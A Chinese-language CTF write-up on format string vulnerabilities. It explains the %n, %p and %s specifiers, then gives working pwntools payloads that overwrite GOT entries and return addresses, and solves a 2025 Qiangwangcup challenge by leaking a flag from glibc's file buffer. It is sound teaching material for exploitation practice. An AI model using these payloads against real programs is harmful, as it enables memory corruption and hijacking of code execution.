---
title: format string
date: 2025-10-26 23:33:43
categories: 
  - CTF技巧
tags:
  - CTF
  - pwn
  - fmt
---

# 格式化字符串漏洞

格式化字符串漏洞是由于程序在处理用户输入的格式化字符串时，没有正确验证输入内容，导致攻击者可以通过精心构造的格式化字符串来读取或写入内存中的任意数据，从而实现信息泄露或代码执行等攻击。

一般通过以下格式化符触发漏洞：

- `%N$x`: 读取寄存器或栈上**第N个数据**并以十六进制格式输出
- `%N$p`: 读取寄存器或栈上**第N个数据**并以指针格式输出
- `%N$s`: 读取寄存器或栈上**第N个地址**并输出该地址指向的字符串；若出现在`scanf`中且未限制长度，则存在**缓冲区溢出漏洞**
- `%N$n`: 将已经输出的字符数写入寄存器或栈上**第N个地址**指向的内存位置
- `%Nc`: 打印一个字符并用空格填充到N个字符
- `%*N$c`: 打印一个字符并用空格填充到width个字符，width的值从栈上第N个数据获取(int类型)

其中使用`%N$x`和`%N$p`可以泄露栈上的数据，而使用`%N$s`结合栈上的地址几乎可以进行任意地址读；使用`%Nc`与`%N$n`再结合栈上的地址可以实现任意地址写。

对于栈上构造地址，一般有两种情况：

- 一是可以直接对栈进行写操作，则可以直接将地址写入栈中；
- 而当无法直接写入栈时(比如只能向.bss段写入数据)，即**非栈格式化字符串**的情况，则可以通过**间接构造**的方式来实现任意地址读写(需要至少存在二级栈指针)：先在栈中找到一个可控栈指针，其指向另一个可控栈指针，之后根据需要进行进一步的利用:
  - 如果只需读写栈上的值(如返回地址)，则直接通过一级指针改写二级指针的低字节使其指向栈中目标地址，然后通过改写后的二级指针进行读写即可;
  - 如果需要读写非栈地址(如got表等)，需要先通过一级栈指针改写二级栈指针的低字节从0x00到0x08遍历扫描, 同时通过二级栈指针在其指向的栈地址处从低地址到高地址逐字节构造出任意目标地址(即三级指针), 最后通过格式化字符串对构造出的该任意地址指向的内容进行读写。

此外，对于`%Nc`和`%N$n`的使用，还需要注意有时远程环境会限制输出的字符数，因此在写入较大数值时，可以通过分多次写入的方式来实现。如使用`hn`或`hhn`来分别写入2字节或1字节的数据，以代替`lln`或`n`一次性写入8字节或4字节的数据。

# 例一：栈格式化字符串

```c
int main() {
    char format[264]; // [rsp+0h] [rbp-110h] BYREF
    setup();
    puts("tell me what you want to say:");
    printf("\n> ");
    strcpy(format, "That's what you want to say...    ");
    read(0, &format[34], 0x100uLL);
    printf(format);
    puts("\nthat's it? boring... bye");
    exit(1);
}
```

题目很简单，读取输入进栈中然后拼接格式化字符串进行输出，题目还额外给了`win`函数，则可以在栈中直接写入`exit`函数的got表地址，然后利用任意地址写将其中的地址改为`win`函数地址。

这里简单介绍一下exp的写法。正常来说，通过`%Nc`输出字符数至我们需要的值, 然后通过`%N$n`将字符数写入目标指针指向的地址即可。这里需要注意的是，栈中前34个字节已经被固定字符串占用，因此我们需要将`win`函数地址减去34再进行写入:

```python
win = elf.symbols['win']
exit_got = elf.got['exit']
payload = b"%" + str(win - 34).encode() + b"c%12$lln" + p64(exit_got)
```

而有时我们不需要写入全部的值，比如这里的exit函数中got表的地址还未被动态链接修改，其中存放的仍是exit函数的plt地址，与win函数地址的高位部分是相同的，因此我们只需要写入低两字节即可:

```python
payload = b"%" + str((win & 0xffff) - 34).encode() + b"AAAc%12$hn" + p64(exit_got)
```

若两字节地址所需输出的字符数量对环境来说仍然过大，可以分两次写入:

```python
payload = b"%" + str((win & 0xff) - 34).encode() + b"AAAAAc%12$hn" + p64(exit_got) + \
          b"%" + str((((win >> 8) & 0xff) - (win & 0xff) + 14) & 0xff).encode() + b"AAAAAAc%15$hn" + p64(exit_got + 1)
```

pwntools中也提供了`fmtstr_payload`函数来简化格式化字符串的构造:

```python
payload = b'A' * 0x6 + fmtstr_payload(12, {exit_got: win & 0xffff}, 34, 'short')
```

# 例二：非栈格式化字符串

题目如下：

```c
char global_buffer[256];
int main() {
    do {
        memset(global_buffer, 0, sizeof(global_buffer));
        puts("说话!");
        read(0, global_buffer, 0xFF);
        printf(global_buffer);
    } while (strcmp(global_buffer, "end\n"));
    return 0;
}
```

题目中输入的格式化字符串被读入到了`.bss`段的`global_buffer`中，因此无法直接在栈上构造地址进行任意地址读写。这里我们可以通过间接构造的方式来实现：

```python
p = process(bin)
# p = gdb.debug(bin)

# 泄露目标栈指针地址
p.sendafter("说话!\n".encode(), b"%6$p")
ret_addr = int(p.recv(14)[-4:], base=16) - 0x98
print(hex(ret_addr))

# 泄露win函数地址
p.sendafter("说话!\n".encode(), b"%11$p")
win = int(p.recv(14), base=16) - 0x38a + 0x289
print(hex(win))

# 在栈中通过栈指针构造指向返回地址的指针(逐两字节构造并写入)
p.sendafter("说话!\n".encode(), b"%" + str(ret_addr).encode() + b"c%6$hn")
p.sendafter("说话!\n".encode(), b"%" + str(win & 0xffff).encode() + b"c%26$hn")

p.sendafter("说话!\n".encode(), b"%" + str(ret_addr+2).encode() + b"c%6$hn")
p.sendafter("说话!\n".encode(), b"%" + str((win & 0xffff0000)>>16).encode() + b"c%26$hn")

p.sendafter("说话!\n".encode(), b"%" + str(ret_addr+4).encode() + b"c%6$hn")
p.sendafter("说话!\n".encode(), b"%" + str((win & 0xffff00000000)>>32).encode() + b"c%26$hn")

p.sendafter("说话!\n".encode(), b"end\n")

p.interactive()
```

# 例三：Others

虽然有了格式化字符串就相当于有了任意地址读写，可以打got表、ret2win、ret2libc等，但如果题目限制的特别死，保护开的极多(如Full RELRO、沙箱等), 我们就要注意结合其他漏洞及特性来达到目的。

最后放上一道2025年强网杯的题目作为本文的结束。题目去掉无关紧要的部分大致还原如下:

```c
char oflag[256] = "everything is ok~";
char format[] = "You are so parsimonious!!!";
int generous = 0;
int main() {
    char s[16];
    char flag[64];
    char *filename = "/flag";
    stream = fopen(filename, "r");
    generous = 1;
    while ( 1 ) {
      while ( 1 ) {
        puts("welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit");
        memset(s, 0, sizeof(s));
        read(0, s, 0x10uLL);
        if ( atoi(s) != 1 )
          exit(0);
        puts("how much you want to pay?");
        memset(s, 0, sizeof(s));
        read(0, s, 0x10uLL);
        if ( atoi(s) == 0xFF )
          break;
        printf("You are so parsimonious!!!");     // format string
        if ( generous ) {
          fclose(stream);
          generous = 0;
        }
      }
      puts("Thank you for paying, let me give you flag: ");
      if ( !generous || !fgets(flag, 64, stream) )
        break;
      puts("=============error!!!=============");
      memset(flag, 0, 0x40uLL);
      puts("please report:");
      memset(oflag, 0, 0x100uLL);
      __isoc99_scanf("%s", oflag);
      getchar();
      puts("OK,now you can exit or try again.");
    }
    puts("something is wrong");
    return 0LL;
}
```

原本IDA反编译时直接写的是printf加后面的字符串，进一步查看后才发现里面的字符串参数并不是一般的放在readonly段的字符串常量，而是一个可控的全局变量`format`；且后面的scanf函数使用`%s`读入输入并没有限制长度，并且读入的位置oflag也在data段，并且刚好在format的上面，因此可以覆盖掉后面的格式化字符串造成格式化字符串漏洞。

实际上，这里看到一堆`puts`中只出现这一个`printf`就应该有所怀疑了。

题目有意思的一点在于，即使在输入正确的金额程序将flag读入到栈中后，就会立即将其清空报错，因此无法直接通过任意读来泄露flag。这里我们可以利用任意写来打got表，也有两种思路：

- 一是将`memset`的got表中的值改成其他函数，使其不清空栈中的flag；但这里还有个问题，如果触发了格式化字符串漏洞，就不得不走下面`fclose`关闭文件流的逻辑，而导致后续无法读入flag，因此需要同时将`fclose`的got表改掉且重置`generous`变量。这里选择将`memset`的got表改为`puts`的plt地址，将`fclose`的got表改为`main`函数起始地址。
- 另一种方式是之前做某道题目时学到的，对于atoi这种将可控输入作为第一个参数的函数，最简便的利用方式就是直接将其got表内容改为`system`的地址，然后下次读入输入时输入`/bin/sh`即可。

解题过程本该到这里就结束，但比赛结束看其他队的writeup时发现还有更有趣的解法，感觉题目还可以进一步做限制，这里介绍一下。

试想，如果题目开启了**Full RELRO**保护，那么got表都是只读的，无法直接进行修改，这时该如何利用呢？

回想一下C标准库的内部缓冲机制：当调用`fopen`打开一个文件后，C标准库(glibc)会为该文件分配一个`FILE`结构体，然后在**第一次尝试读写**该文件时为这个`FILE`分配内部缓冲区，用于批量处理文件数据。

如果该文件为普通文件，则默认缓冲模式为`全缓冲`，此时缓冲区的大小通常是4KB(可以通过调用`setvbuf`函数来修改缓冲区的大小和类型)。如下图所示，其中第一个堆块为`tcache_perthread_struct`结构体，第二个堆块为`_IO_FILE_plus`结构体，第三个堆块即为分配的文件内部缓冲区:

![heap](images/heap.png)

![heapdata](images/heapdata.png)

以本题的从文件中读入数据为例，当调用`fgets`时，glibc会先检查`FILE`结构体中的缓冲区指针是否为NULL，若为NULL则会调用`_IO_new_file_overflow`函数为其分配缓冲区。若缓冲区指针不为空，则会检查内部缓冲区是否有足够的数据可供读取，只有在缓冲区数据不足时才会调用底层系统调用`read`来从文件中读取一大块数据到内部缓冲区上；否则则直接从缓冲区中读取数据将其复制到用户的目标地址中。

因此，对于本题而言，即使程序在将flag读入栈中后立即将其清空，但堆中的文件内部缓冲区中仍然保存着flag的内容，只要我们能拿到这个缓冲区的地址，就能直接通过格式化字符串漏洞将其读出。

首先泄露出libc地址，在libc的data段中存在一个`malloc_par`类型的结构体`mp_`，这个全局结构中的`sbrk_base`变量保存着指向**第一个mmap/brk区域的起始地址**的指针，即程序第一次使用`brk`系统调用创建的heap的起点。

```c
// Definition from malloc/malloc.c
struct malloc_par {
  unsigned long trim_threshold;
  unsigned long top_pad;
  size_t mmap_threshold;
  int n_mmaps;
  int n_mmaps_max;
  int max_n_mmaps;
  int no_dyn_threshold;
  int check_action;
  unsigned long pagesize;
  unsigned long mmapped_mem;
  unsigned long max_mmapped_mem;
  unsigned long max_total_mem;
  unsigned long sbrk_base;  // sbreak area(heap) base: +0x60
  ...
};
```

通过gdb查看mp_的地址并计算偏移，然后通过格式化字符串泄露出`sbrk_base`的值:

![gdb](images/gdb.png)

最后计算出文件缓冲区堆块的地址，通过格式化字符串读出flag即可。
